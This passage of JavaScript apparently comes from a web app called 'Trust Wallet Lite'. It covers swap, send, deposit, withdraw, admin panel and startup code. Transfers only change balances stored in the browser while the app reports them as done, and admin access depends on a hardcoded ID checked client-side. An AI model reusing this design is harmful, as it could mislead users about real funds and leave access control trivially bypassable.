                <i class="fas fa-moon"></i>
                <div>
                    <div class="label">${t('settings.theme')}</div>
                    <div class="desc">${currentTheme === 'dark' ? 'Dark Mode' : 'Light Mode'}</div>
                </div>
                <i class="fas fa-chevron-right"></i>
            </div>
            <div class="settings-item" onclick="showBackupWallet()">
                <i class="fas fa-database"></i>
                <div>
                    <div class="label">${t('settings.backup')}</div>
                    <div class="desc">${t('coming.soon')}</div>
                </div>
                <i class="fas fa-chevron-right"></i>
            </div>
            <div class="settings-item logout-btn" onclick="logout()">
                <i class="fas fa-sign-out-alt"></i>
                <div>
                    <div class="label">${t('settings.logout')}</div>
                    <div class="desc">Sign out of your wallet</div>
                </div>
            </div>
        </div>
        <div style="text-align:center;margin-top:24px;">
            <span style="font-size:10px; color:var(--text-muted);">Trust Wallet Lite v5.0</span>
        </div>
    `;
}

function showBackupWallet() { showToast('Coming soon!', 'info'); }

function logout() {
    if (confirm('Logout?')) {
        localStorage.clear();
        location.reload();
    }
}

// ====== 17. SWAP FUNCTIONS ======
let swapFromCurrency = 'TWT';
let swapToCurrency = 'USDT';
let currentCurrencySelector = 'from';

function showSwapModal() {
    const modal = document.getElementById('swapModal');
    if (modal) modal.classList.add('show');
    renderSwapModal();
}

function renderSwapModal() {
    const container = document.getElementById('swapModalContent');
    if (!container) return;
    
    container.innerHTML = `
        <div class="swap-box">
            <div class="swap-label">${t('swap.from')}</div>
            <div class="swap-row">
                <input type="number" id="swapFromAmount" placeholder="0.00" oninput="calculateSwap()">
                <div class="currency-selector-small" onclick="showSwapCurrencySelector('from')">
                    <img id="swapFromIcon" src="${getCurrencyIcon(swapFromCurrency)}">
                    <span id="swapFromSymbol">${swapFromCurrency}</span>
                    <i class="fas fa-chevron-down"></i>
                </div>
            </div>
            <div class="balance-hint">
                Balance: <span id="swapFromBalance">0</span>
                <span class="percentage-buttons">
                    <button onclick="setSwapPercentage(25)">25%</button>
                    <button onclick="setSwapPercentage(50)">50%</button>
                    <button onclick="setSwapPercentage(100)">Max</button>
                </span>
            </div>
        </div>
        
        <div class="swap-arrow" onclick="swapDirection()"><i class="fas fa-arrow-down"></i></div>
        
        <div class="swap-box">
            <div class="swap-label">${t('swap.to')}</div>
            <div class="swap-row">
                <input type="number" id="swapToAmount" placeholder="0.00" readonly>
                <div class="currency-selector-small" onclick="showSwapCurrencySelector('to')">
                    <img id="swapToIcon" src="${getCurrencyIcon(swapToCurrency)}">
                    <span id="swapToSymbol">${swapToCurrency}</span>
                    <i class="fas fa-chevron-down"></i>
                </div>
            </div>
            <div class="balance-hint">Balance: <span id="swapToBalance">0</span></div>
        </div>
        
        <div class="swap-rate" id="swapRateDisplay">1 ${swapFromCurrency} ≈ ${TWT_PRICE.toFixed(4)} ${swapToCurrency}</div>
        <div class="swap-fee"><span>${t('swap.swapperFee')}</span><span id="swapFee">$0.00</span></div>
        
        <button class="btn-primary" onclick="confirmSwap()"><i class="fas fa-exchange-alt"></i> ${t('swap.confirm')}</button>
    `;
    updateSwapBalances();
    calculateSwap();
}

function updateSwapBalances() {
    if (!userData) return;
    document.getElementById('swapFromBalance').innerText = userData.balances[swapFromCurrency] || 0;
    document.getElementById('swapToBalance').innerText = userData.balances[swapToCurrency] || 0;
}

function showSwapCurrencySelector(type) {
    currentCurrencySelector = type;
    const modal = document.getElementById('currencySelectorModal');
    const currencyList = document.getElementById('currencyList');
    
    currencyList.innerHTML = ALL_ASSETS.map(asset => `
        <div class="currency-list-item" onclick="selectSwapCurrency('${asset.symbol}')">
            <img src="${getCurrencyIcon(asset.symbol)}">
            <div class="currency-list-info"><h4>${asset.name}</h4><p>${asset.symbol}</p></div>
        </div>
    `).join('');
    modal.classList.add('show');
}

function selectSwapCurrency(symbol) {
    if (currentCurrencySelector === 'from') {
        swapFromCurrency = symbol;
        document.getElementById('swapFromIcon').src = getCurrencyIcon(symbol);
        document.getElementById('swapFromSymbol').textContent = symbol;
    } else {
        swapToCurrency = symbol;
        document.getElementById('swapToIcon').src = getCurrencyIcon(symbol);
        document.getElementById('swapToSymbol').textContent = symbol;
    }
    closeModal('currencySelectorModal');
    updateSwapBalances();
    calculateSwap();
}

function calculateSwap() {
    const fromAmount = parseFloat(document.getElementById('swapFromAmount').value) || 0;
    let fromPrice = swapFromCurrency === 'TWT' ? TWT_PRICE : (livePrices[swapFromCurrency]?.price || 0);
    let toPrice = swapToCurrency === 'TWT' ? TWT_PRICE : (livePrices[swapToCurrency]?.price || 0);
    
    if (fromPrice > 0 && toPrice > 0) {
        const toAmount = (fromAmount * fromPrice) / toPrice;
        document.getElementById('swapToAmount').value = toAmount.toFixed(6);
        const fee = fromAmount * fromPrice * SWAP_FEE_PERCENT;
        document.getElementById('swapFee').textContent = `$${fee.toFixed(4)}`;
        document.getElementById('swapRateDisplay').textContent = `1 ${swapFromCurrency} ≈ ${(fromPrice / toPrice).toFixed(6)} ${swapToCurrency}`;
    }
}

function setSwapPercentage(percent) {
    const balance = userData.balances[swapFromCurrency] || 0;
    document.getElementById('swapFromAmount').value = balance * (percent / 100);
    calculateSwap();
}

function swapDirection() {
    const temp = swapFromCurrency;
    swapFromCurrency = swapToCurrency;
    swapToCurrency = temp;
    document.getElementById('swapFromIcon').src = getCurrencyIcon(swapFromCurrency);
    document.getElementById('swapFromSymbol').textContent = swapFromCurrency;
    document.getElementById('swapToIcon').src = getCurrencyIcon(swapToCurrency);
    document.getElementById('swapToSymbol').textContent = swapToCurrency;
    updateSwapBalances();
    calculateSwap();
}

async function confirmSwap() {
    const fromAmount = parseFloat(document.getElementById('swapFromAmount').value);
    const toAmount = parseFloat(document.getElementById('swapToAmount').value);
    
    if (!fromAmount || fromAmount <= 0) { showToast('Enter valid amount', 'error'); return; }
    if ((userData.balances[swapFromCurrency] || 0) < fromAmount) { showToast('Insufficient balance', 'error'); return; }
    
    userData.balances[swapFromCurrency] -= fromAmount;
    userData.balances[swapToCurrency] = (userData.balances[swapToCurrency] || 0) + toAmount;
    
    addTransaction({ type: 'swap', fromAmount, fromCurrency: swapFromCurrency, toAmount, toCurrency: swapToCurrency });
    saveUserData();
    updateUI();
    updateSwapBalances();
    document.getElementById('swapFromAmount').value = '';
    calculateSwap();
    closeModal('swapModal');
    showToast('Swap completed!');
}

// ====== 18. SEND/RECEIVE/HISTORY ======
function showSendModal() {
    document.getElementById('sendModal').classList.add('show');
}

async function sendTransaction() {
    const currency = document.getElementById('sendCurrency').value;
    const amount = parseFloat(document.getElementById('sendAmount').value);
    const address = document.getElementById('sendAddress').value;
    
    if (!amount || amount <= 0 || !address) { showToast('Fill all fields', 'error'); return; }
    if ((userData.balances[currency] || 0) < amount) { showToast('Insufficient balance', 'error'); return; }
    
    userData.balances[currency] -= amount;
    addTransaction({ type: 'send', amount, currency, toAddress: address });
    saveUserData();
    updateUI();
    closeModal('sendModal');
    document.getElementById('sendAmount').value = '';
    document.getElementById('sendAddress').value = '';
    showToast(`Sent ${amount} ${currency}`);
}

function showReceiveModal() {
    document.getElementById('receiveModal').classList.add('show');
    document.getElementById('receiveAddress').innerText = userData.userId;
}

function copyAddress() {
    copyToClipboard(document.getElementById('receiveAddress').innerText);
}

function showHistory() {
    const modal = document.getElementById('historyModal');
    const list = document.getElementById('historyList');
    if (!modal || !list) return;
    
    const txs = userData?.transactions || [];
    if (txs.length === 0) {
        list.innerHTML = '<div style="text-align:center;padding:40px;">📭 No transactions</div>';
    } else {
        list.innerHTML = txs.slice(0, 50).map(tx => `
            <div class="history-item">
                <div class="history-item-header"><span>${tx.type}</span><span>${new Date(tx.timestamp).toLocaleDateString()}</span></div>
                <div class="history-details">${tx.amount || tx.fromAmount} ${tx.currency || tx.fromCurrency}</div>
            </div>
        `).join('');
    }
    modal.classList.add('show');
}

// ====== 19. DEPOSIT/WITHDRAW ======
async function showDepositModal() {
    const modal = document.getElementById('depositModal');
    modal.classList.add('show');
    const currency = document.getElementById('depositCurrency').value;
    const result = await createDepositAddress(userData.userId, currency);
    document.getElementById('depositAddress').innerText = result.address || `0x${userData.userId.slice(-40)}`;
    document.getElementById('depositMinAmount').innerText = WITHDRAW_MINIMUMS[currency] || 10;
}

function copyDepositAddress() {
    copyToClipboard(document.getElementById('depositAddress').innerText);
}

function showWithdrawModal() {
    document.getElementById('withdrawModal').classList.add('show');
    updateWithdrawInfo();
}

function updateWithdrawInfo() {
    const currency = document.getElementById('withdrawCurrency').value;
    document.getElementById('withdrawMinAmount').innerText = WITHDRAW_MINIMUMS[currency] || 10;
    document.getElementById('withdrawFee').innerText = (WITHDRAW_FEES[currency] || 1) + ' ' + currency;
}

async function submitWithdraw() {
    const currency = document.getElementById('withdrawCurrency').value;
    const amount = parseFloat(document.getElementById('withdrawAmount').value);
    const address = document.getElementById('withdrawAddress').value;
    
    if (!amount || amount <= 0 || !address) { showToast('Fill all fields', 'error'); return; }
    if ((userData.balances[currency] || 0) < amount) { showToast('Insufficient balance', 'error'); return; }
    
    userData.balances[currency] -= amount;
    addTransaction({ type: 'withdraw', amount, currency, address, status: 'pending' });
    saveUserData();
    updateUI();
    closeModal('withdrawModal');
    document.getElementById('withdrawAmount').value = '';
    document.getElementById('withdrawAddress').value = '';
    showToast(`Withdrawal request submitted for ${amount} ${currency}`);
}

function addTransaction(tx) {
    if (!userData.transactions) userData.transactions = [];
    userData.transactions.unshift({ ...tx, timestamp: new Date().toISOString() });
    saveUserData();
}

// ====== 20. ADMIN PANEL ======
function showAdminPanel() {
    if (!isAdmin) { showToast('Access denied', 'error'); return; }
    document.getElementById('adminPanel').classList.remove('hidden');
    document.getElementById('adminContent').innerHTML = '<div style="padding:20px;text-align:center;">Admin panel ready<br><button onclick="refreshAdminPanel()" class="btn-primary" style="margin-top:10px;">Refresh</button></div>';
}

function closeAdminPanel() {
    document.getElementById('adminPanel').classList.add('hidden');
}

async function refreshAdminPanel() {
    if (!isAdmin) return;
    const content = document.getElementById('adminContent');
    content.innerHTML = '<div style="text-align:center;padding:20px;"><i class="fas fa-spinner fa-spin"></i> Loading...</div>';
    content.innerHTML = '<div style="padding:20px;"><h4>Admin Dashboard</h4><p>Search users by ID or wallet address</p><input type="text" id="adminSearch" placeholder="User ID or Address" style="width:100%;padding:10px;margin:10px 0;border-radius:8px;"><button onclick="searchUser()" class="btn-primary">Search</button><div id="adminResult"></div></div>';
}

// ====== 21. NAVIGATION ======
function showWallet() { 
    currentPage = 'wallet'; 
    updateTabs(); 
    renderWallet(); 
    showRandomSticker();
}

function showAirdrop() { 
    currentPage = 'airdrop'; 
    updateTabs(); 
    renderAirdrop(); 
    showRandomSticker();
}

function showTWTPay() { 
    currentPage = 'twtpay'; 
    updateTabs(); 
    renderTWTPay(); 
    showRandomSticker();
}

function showSettings() { 
    currentPage = 'settings'; 
    updateTabs(); 
    renderSettings(); 
    showRandomSticker();
}

function updateTabs() {
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('referralSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    
    if (currentPage === 'wallet') document.getElementById('walletSection').classList.remove('hidden');
    else if (currentPage === 'airdrop') document.getElementById('referralSection').classList.remove('hidden');
    else if (currentPage === 'twtpay') document.getElementById('twtpaySection').classList.remove('hidden');
    else if (currentPage === 'settings') document.getElementById('settingsSection').classList.remove('hidden');
    
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    let tabName = currentPage === 'airdrop' ? 'referral' : currentPage;
    document.querySelector(`.nav-item[data-tab="${tabName}"]`)?.classList.add('active');
}

// ====== 22. INITIALIZATION ======
document.addEventListener('DOMContentLoaded', async () => {
    initTheme();
    
    document.querySelectorAll('.nav-item').forEach(btn => {
        btn.addEventListener('click', () => {
            const tab = btn.getAttribute('data-tab');
            if (tab === 'wallet') showWallet();
            else if (tab === 'referral') showAirdrop();
            else if (tab === 'twtpay') showTWTPay();
            else if (tab === 'settings') showSettings();
        });
    });
    
    document.getElementById('createWalletBtn').onclick = createNewWallet;
    document.getElementById('importWalletBtn').onclick = showImportModal;
    document.getElementById('confirmImportBtn').onclick = importWallet;
    
    await fetchLivePrices();
    
    const hasUser = localStorage.getItem('twt_user_id');
    if (hasUser && localStorage.getItem(`user_${hasUser}`)) {
        userData = JSON.parse(localStorage.getItem(`user_${hasUser}`));
        isAdmin = (hasUser === '1653918641');
        showMainApp();
        updateUI();
        checkAdminAndAddCrown();
    } else {
        showOnboarding();
    }
    
    setTimeout(() => {
        document.getElementById('splashScreen').classList.add('hidden');
        initFloatingNotifications();
    }, 2000);
});

// ====== 23. EXPOSE GLOBALS ======
window.showWallet = showWallet;
window.showAirdrop = showAirdrop;
window.showTWTPay = showTWTPay;
window.showSettings = showSettings;
window.showSendModal = showSendModal;
window.showReceiveModal = showReceiveModal;
window.showSwapModal = showSwapModal;
window.showDepositModal = showDepositModal;
window.showWithdrawModal = showWithdrawModal;
window.showHistory = showHistory;
window.showNotifications = showNotifications;
window.showAdminPanel = showAdminPanel;
window.closeModal = closeModal;
window.closeAdminPanel = closeAdminPanel;
window.refreshPrices = refreshPrices;
window.calculateSwap = calculateSwap;
window.confirmSwap = confirmSwap;
window.setSwapPercentage = setSwapPercentage;
window.swapDirection = swapDirection;
window.sendTransaction = sendTransaction;
window.submitWithdraw = submitWithdraw;
window.copyAddress = copyAddress;
window.copyDepositAddress = copyDepositAddress;
window.copyInviteLink = copyInviteLink;
window.shareInvite = shareInvite;
window.claimMilestone = claimMilestone;
window.toggleLanguage = toggleLanguage;
window.toggleTheme = toggleTheme;
window.logout = logout;
window.createNewWallet = createNewWallet;
window.importWallet = importWallet;
window.showImportModal = showImportModal;
window.refreshAdminPanel = refreshAdminPanel;

console.log("✅ Trust Wallet Lite v5.0 - ULTIMATE PROFESSIONAL VERSION");
console.log("✅ Zero Waste Architecture | 12 Cryptocurrencies | Airdrop System");
console.log("✅ TWT Pay Virtual Card | Dark/Light Mode | RTL Support");
